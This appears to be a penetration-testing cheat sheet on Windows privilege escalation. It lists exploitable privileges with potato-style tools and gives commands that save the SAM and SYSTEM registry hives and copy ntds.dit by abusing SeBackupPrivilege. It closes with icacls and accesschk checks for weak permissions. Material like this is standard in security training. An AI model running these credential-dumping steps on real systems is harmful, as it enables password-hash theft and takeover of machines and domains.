# Windows Privilege

## User Privilege

### Default Privilege

    Privilege Name                Description                          State
    ============================= ==================================== ========
    SeShutdownPrivilege           Shut down the system                 Disabled
    SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
    SeUndockPrivilege             Remove computer from docking station Disabled
    SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
    SeTimeZonePrivilege           Change the time zone                 Disabled

### Privilege exploitable 

SeImpersonatePrivilege 

- juicy-potato
- RogueWinRM (needs winrm disabled)
- SweetPotato
- PrintSpoofer

SeBackupPrivilege

https://github.com/giuliano108/SeBackupPrivilege


    C:\scripts> reg save hklm\sam sam
    C:\scripts> reg save hklm\system system

    PS C:\scripts> Import-Module .\SeBackupPrivilegeUtils.dll
    PS C:\scripts> Import-Module .\SeBackupPrivilegeCmdLets.dll
    PS C:\scripts> Get-SeBackupPrivilege
    PS C:\scripts> Copy-FileSeBackupPrivilege c:\Windows\NTDS\ntds.dit ntds.dit

SeRestorePrivilege 

    Write access control to any file on the system, regardless of the files ACL.

## File Permissions

> Simple right

	F (full access)
	M (modify access)
	RX (read and execute access)
	R (read-only access)
	W (write-only access)

> Read permission

```
icacls FILE_OR_DIR
```

> Set Permissions
```
icacls "FILE_OR_DIR" /grant USERNAME:PERMISSIONS
```
> Set Full Permissions
```
icacls "FILE_OR_DIR" /grant USERNAME:F
```

### Weak permissions - accesschk

Group `Users`:
```
accesschk64.exe -w -s -u -d "Users" "C:\Program Files"
accesschk64.exe -w -s -u -d "Users" "C:\Program Files (x86)"
accesschk64.exe -w -s -u -d "Users" "C:\Windows"
```

Permission of `Authenticated Users`:
```
accesschk64.exe -w -s -u -d "Authenticated Users" "C:\Program Files"
accesschk64.exe -w -s -u -d "Authenticated Users" "C:\Program Files (x86)"
accesschk64.exe -w -s -u -d "Authenticated Users" "C:\Windows"
```

Permission of `Everyone`:
```
accesschk64.exe -w -s -u -d "Everyone" "C:\Program Files"
accesschk64.exe -w -s -u -d "Everyone" "C:\Program Files (x86)"
accesschk64.exe -w -s -u -d "Everyone" "C:\Windows"
```
